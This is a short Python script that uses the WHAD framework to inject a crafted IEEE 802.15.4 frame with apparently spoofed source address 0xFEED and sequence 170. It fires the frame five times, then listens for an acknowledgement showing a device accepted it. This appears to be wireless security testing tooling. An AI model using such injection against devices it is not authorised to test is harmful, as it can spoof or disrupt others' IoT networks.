from whad.device import WhadDevice
from whad.dot15d4.connector import Dot15d4
import struct
import time
 
# 1. Connect to the radio
dev = WhadDevice.create("uart0")
connector = Dot15d4(dev)
 
# 2. Craft the 'Visible' Hex 
# will need to change the HEX value
visible_hex = bytes.fromhex("6188AA19C702E7FEEDDE1A0000F41D1E3C6E03DE39004B120013EDE6FF0F060EB4287FB20000E5925E4200A213000063B78BEB47788271")
 
print("[*] Firing Visible Packet (Seq: 170, Src: 0xFEED)...")
 
# 3. Fire and Listen Loop
try:
    # Set the channel before starting
    # Note: If the version lacks .set_channel, ensure hardware is preset via wsniff
    
    # Fire 5 copies of the packet to ensure one lands
    for _ in range(5):
        connector.send(visible_hex)
        time.sleep(0.01)
    
    print("[!] Injection sent. Switching to Monitor mode for 5 seconds...")
    
    # Start a mini-sniffer inside the same script to catch the ACK
    start_time = time.time()
    while time.time() - start_time < 5:
        # This is a 'wait' for any incoming packet
        pkt = connector.wait_packet(timeout=0.1)
        if pkt:
            # Check if we see an ACK for our sequence 170 (0xAA)
            if b"\x02\x00\xaa" in bytes(pkt):
                print("[SUCCESS] Found ACK for Seq 170! The device accepted the packet.")
            else:
                print(f"[*] Caught other traffic: {bytes(pkt).hex()[:20]}...")
 
finally:
    dev.close()